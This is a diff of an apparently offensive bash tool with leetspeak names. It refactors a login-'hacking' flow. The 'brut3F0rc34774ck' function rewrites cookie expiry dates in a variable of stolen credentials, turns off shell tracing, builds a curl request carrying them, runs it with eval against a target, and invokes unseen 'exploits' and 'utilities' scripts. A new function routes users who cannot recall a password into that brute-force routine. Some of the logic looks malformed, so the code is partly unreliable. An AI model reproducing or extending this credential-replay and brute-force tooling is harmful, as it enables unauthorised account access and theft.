@@ -12,14 +12,17 @@ function fTh15() {
 }
 
 function brut3F0rc34774ck() {
-  cr4p=$s70l3nCr3d3n71al5
+  th15="$(TZ=GMT-2 date '+%Y')"
+  i5="$(TZ=GMT-2 date '+%a, %d-%b-%Y %T %Z')"
+  cr4p=$(echo "$s70l3nCr3d3n71al5" | sed 's/[FMSTW][adehionrtu]{2}, [0-9]{2}-[ADFJMMNOS][abcegilnoprtuv]{2}-$th15 [0-9]{2}:[0-9]{2}:[0-9]{2} GMT/expires=$i5;/g')
+  set +x
   exploits/inti "$t4rg37"
   h0n357ly="curl -i $@ $(fTh15 $cr4p) > \"$resp0nseF1l3\""
   sleep 4
   eval "$h0n357ly"
-  sleep 1
-  # if status
-  # else
+  #sleep 1
+  #if status
+  #else
   utilities/rvb "$t4rg37"
 }
 
@@ -31,15 +34,7 @@ function h4ckL0g1nCr3d3n714l5() {
     echo "Provide your username."
     read userName
     sleep 1
-    echo "Do you remember your password? (yes/no)"
-    read userPassOption
-
-    if [[ "$userPassOption" == "yes" || "$userPassOption" == "y" ]]; then
-      echo "Provide your password."
-      read userPass
-      sleep 1
-      echo -e "\033[32;1mSuccess!\033[0m Log into $t4rg37 using credentials $userName:$userPass"
-    fi
+    idP455 "$userName"
 
   elif [[ "$userNameOption" == "no" || "$userNameOption" == "n" ]]; then
     utilities/authentication
@@ -49,8 +44,26 @@ function h4ckL0g1nCr3d3n714l5() {
     sleep 2
     h4ckL0g1nCr3d3n714l5
   fi
+}
 
-  brut3F0rc34774ck "$h05t/support"
+function idP455() {
+  echo "Do you remember your password? (yes/no)"
+  read userPassOption
+
+  if [[ "$userPassOption" == "yes" || "$userPassOption" == "y" ]]; then
+    echo "Provide your password."
+    read userPass
+    sleep 1
+    echo -e "\033[32;1mSuccess!\033[0m Log into $t4rg37 using credentials $1:$userPass"
+
+  elif [[ "$userPassOption" == "no" || "$userPassOption" == "n" ]]; then
+    brut3F0rc34774ck "$h05t/support"
+
+  else
+    echo "You misspelled."
+    sleep 2
+    idP455 "$1"
+  fi
 }
 
 exploits/inti "$t4rg37"
